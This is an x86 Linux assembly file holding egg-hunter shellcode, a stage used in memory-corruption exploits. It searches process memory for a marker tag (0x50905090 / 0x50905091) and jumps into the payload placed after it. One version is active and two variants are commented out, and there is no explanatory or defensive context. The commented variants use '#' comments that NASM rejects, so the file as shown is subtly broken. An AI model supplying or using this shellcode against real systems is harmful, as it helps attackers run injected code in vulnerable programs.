section .text
    global _start

_start:
    xor edx, edx
.nextpage:
    or dx, 0xfff
.nextbyte:
    inc edx
    lea ebx, [edx]
    push byte 0xc        ; chdir syscall
    pop eax
    int 80h
    cmp al, 0xf2
    jz .nextpage
    mov eax, 0x50905090
    inc eax
    mov edi, edx
    scasd
    jnz .nextbyte
    jmp edi


# _start:
#     xor edx, edx
# .nextpage:
#     or dx, 0xfff
# .nextbyte:
#     inc edx
#     lea ebx, [edx+0x4]
#     push byte 0xC
#     pop eax
#     int 80h
#     cmp al, 0xf2
#     jz .nextpage
#     mov eax, 0x50905090
#     mov edi, edx
#     scasd
#     jnz .nextbyte
#     scasd
#     jnz .nextbyte
#     jmp edi


# _start:
#     xor edx, edx
# .nextpage:
#     or dx, 0xfff
# .nextbyte:
#     inc edx
#     lea ebx, [edx+0x4]
#     push byte 0x21
#     pop eax
#     xor ecx, ecx       ; Set the second argument
#     int 80h
#     cmp al, 0xf2
#     jz .nextpage
#     mov eax, 0x50905090
#     mov edi, edx
#     scasd
#     jnz .nextbyte
#     scasd
#     jnz .nextbyte
#     jmp edi
